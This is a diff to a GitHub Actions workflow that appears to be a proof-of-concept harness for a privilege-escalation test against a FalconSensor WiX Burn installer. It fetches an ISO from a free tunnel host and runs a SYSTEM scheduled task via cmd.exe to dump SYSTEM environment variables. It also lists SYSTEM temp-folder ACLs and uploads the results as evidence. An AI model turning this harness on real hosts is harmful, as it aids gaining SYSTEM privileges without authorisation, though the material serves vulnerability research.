@@ -12,7 +12,7 @@ jobs:
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Stop'
-          $u = 'http://awqhq-2600-1f18-68f7-2200-4028-a0ee-80f3-3d13.run.pinggy-free.link:32953/falcon-wix-poc.iso'
+          $u = 'http://ueqey-2600-1f18-68f7-2200-4028-a0ee-80f3-3d13.run.pinggy-free.link:38591/falcon-wix-poc.iso'
           Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
           $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc.iso" -Algorithm SHA256).Hash.ToLower()
           Write-Host "ISO SHA256=$h"
@@ -40,10 +40,10 @@ jobs:
           Write-Host "Started low watcher PID=$($low.Id)"
           Start-Sleep -Seconds 3
           $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
-          $sysAction=New-ScheduledTaskAction -Execute 'C:\poc\readonly\FalconSensor.exe' -Argument '/help'
+          $sysAction=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c "set > C:\poc\results\system-env.txt & C:\poc\readonly\FalconSensor.exe /help"'
           Register-ScheduledTask -TaskName BurnSystemInstaller -Action $sysAction -Trigger $trigger -User 'SYSTEM' -RunLevel Highest -Force | Out-Null
           Start-ScheduledTask -TaskName BurnSystemInstaller
-          Start-Sleep -Seconds 45
+          Start-Sleep -Seconds 75
           exit 0
       - name: Collect proof
         if: always()
@@ -58,6 +58,14 @@ jobs:
           cmd /c 'net user burnlow' | Add-Content $out
           "--- tasks ---" | Add-Content $out
           schtasks /query /tn BurnSystemInstaller /v /fo list | Add-Content $out
+          "--- SYSTEM environment ---" | Add-Content $out
+          if (Test-Path C:\poc\results\system-env.txt) { Get-Content C:\poc\results\system-env.txt | Add-Content $out; Copy-Item C:\poc\results\system-env.txt "$env:RUNNER_TEMP\system-env.txt" -Force }
+          "--- SYSTEM temp roots ---" | Add-Content $out
+          foreach ($tempRoot in @('C:\Windows\Temp','C:\Windows\SystemTemp','C:\Windows\System32\config\systemprofile\AppData\Local\Temp')) {
+            "ROOT=$tempRoot" | Add-Content $out
+            cmd /c "icacls $tempRoot" | Add-Content $out
+            Get-ChildItem -Force $tempRoot -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 30 Name,Length,CreationTime,LastWriteTime | Format-Table -AutoSize | Out-String | Add-Content $out
+          }
           "--- protected input ACL and hash ---" | Add-Content $out
           icacls C:\poc\readonly\FalconSensor.exe | Add-Content $out
           Get-FileHash C:\poc\readonly\FalconSensor.exe -Algorithm SHA256 | Format-List | Out-String | Add-Content $out
@@ -74,6 +82,7 @@ jobs:
           path: |
             ${{ runner.temp }}/proof-summary.txt
             ${{ runner.temp }}/watcher.log
+            ${{ runner.temp }}/system-env.txt
           if-no-files-found: warn
       - name: Cleanup
         if: always()
